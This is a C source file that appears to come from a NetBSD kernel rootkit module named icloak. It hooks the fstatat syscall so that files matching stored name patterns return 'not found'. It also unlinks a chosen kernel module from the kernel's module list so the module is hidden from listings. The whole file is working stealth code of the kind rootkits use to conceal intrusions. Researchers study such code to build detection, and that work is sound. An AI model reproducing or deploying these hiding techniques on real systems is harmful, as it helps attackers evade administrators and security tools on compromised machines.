/*
 *                                Copyright (C) 2018 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/syscallargs.h>
#include <sys/module.h>
#include <utils/icloak_ctx.h>
#include <utils/memory.h>
#include <kook.h>
#include <sys/dirent.h>
#include <sys/mutex.h>

static module_t *find_kmod(const char *name);

static int icloak_fstatat(struct lwp *l,
			  const struct sys_fstatat_args *uap,
                          register_t *retval);

int (*fstatat_syscall)(struct lwp *l,
		       const struct sys_fstatat_args *uap,
		       register_t *retval) = NULL;

static int g_icloak_mtx_init = 0;

static kmutex_t g_icloak_hidden_patterns_mtx;

static icloak_filename_pattern_ctx *g_icloak_hidden_patterns = NULL,
	*g_icloak_hidden_patterns_tail = NULL;


#define init_hidden_patterns_mutex {\
	if (!g_icloak_mtx_init) {\
		mutex_init(&g_icloak_hidden_patterns_mtx,\
			   MUTEX_DEFAULT,\
			   IPL_NONE);\
		g_icloak_mtx_init = 1;\
	}\
}

#define lock_hidden_patterns_mutex(stmt) {\
	if (!mutex_tryenter(&g_icloak_hidden_patterns_mtx)) {\
		stmt;\
	}\
}

#define unlock_hidden_patterns_mutex {\
	mutex_exit(&g_icloak_hidden_patterns_mtx);\
}

int native_hide_file(const char *pattern) {
	if (pattern == NULL) {
		return 1;
	}

	init_hidden_patterns_mutex

	if (fstatat_syscall == NULL) {
		kook(SYS_fstatat, icloak_fstatat,
		    (void **)&fstatat_syscall);
	}

	// TODO(Rafael): Handle getdirentries.

	lock_hidden_patterns_mutex(return 1);

	g_icloak_hidden_patterns = icloak_add_filename_pattern(
				g_icloak_hidden_patterns,
				pattern, strlen(pattern),
				&g_icloak_hidden_patterns_tail);

	unlock_hidden_patterns_mutex

	return 0;
}

int native_show_file(const char *pattern) {
	if (pattern == NULL) {
		return 1;
	}

	init_hidden_patterns_mutex

	lock_hidden_patterns_mutex(return 1);

	g_icloak_hidden_patterns = icloak_del_filename_pattern(
				g_icloak_hidden_patterns, pattern);

	if (g_icloak_hidden_patterns == NULL) {
		if (fstatat_syscall != NULL) {
			if (kook(SYS_fstatat,
				 fstatat_syscall, NULL) == 0) {
				fstatat_syscall = NULL;
			}
		}

		// TODO(Rafael): Handle getdirentries.

		g_icloak_mtx_init = 0;
		unlock_hidden_patterns_mutex

		mutex_destroy(&g_icloak_hidden_patterns_mtx);

		goto native_show_file_epilogue;

	}

	unlock_hidden_patterns_mutex

native_show_file_epilogue:

	return 0;
}

static int icloak_fstatat(struct lwp *l,
                          const struct sys_fstatat_args *uap,
                          register_t *retval) {
	int matches;

	lock_hidden_patterns_mutex(return EFAULT);

	matches = icloak_match_filename(SCARG(uap, path),
					g_icloak_hidden_patterns);

	unlock_hidden_patterns_mutex

	if (matches) {
		return ENOENT;
	}

	return fstatat_syscall(l, uap, retval);	
}

int native_icloak_ko(const char *name) {
    int deleted = 0;
    module_t *mp;

    if (name == NULL) {
        return 1;
    }

    mp = find_kmod(name);

    if (mp != NULL) {
        kernconfig_lock();
        module_count--;
        TAILQ_REMOVE(&module_list, mp, mod_chain);
        deleted = 1;
        kernconfig_unlock();
    }

    return (deleted == 1) ? 0 : 1;
}

static module_t *find_kmod(const char *name) {
    module_t *mp;
    TAILQ_FOREACH(mp, &module_list, mod_chain) {
        if (strcmp(mp->mod_info->mi_name, name) == 0) {
            return mp;
        }
    }
    return NULL;
}
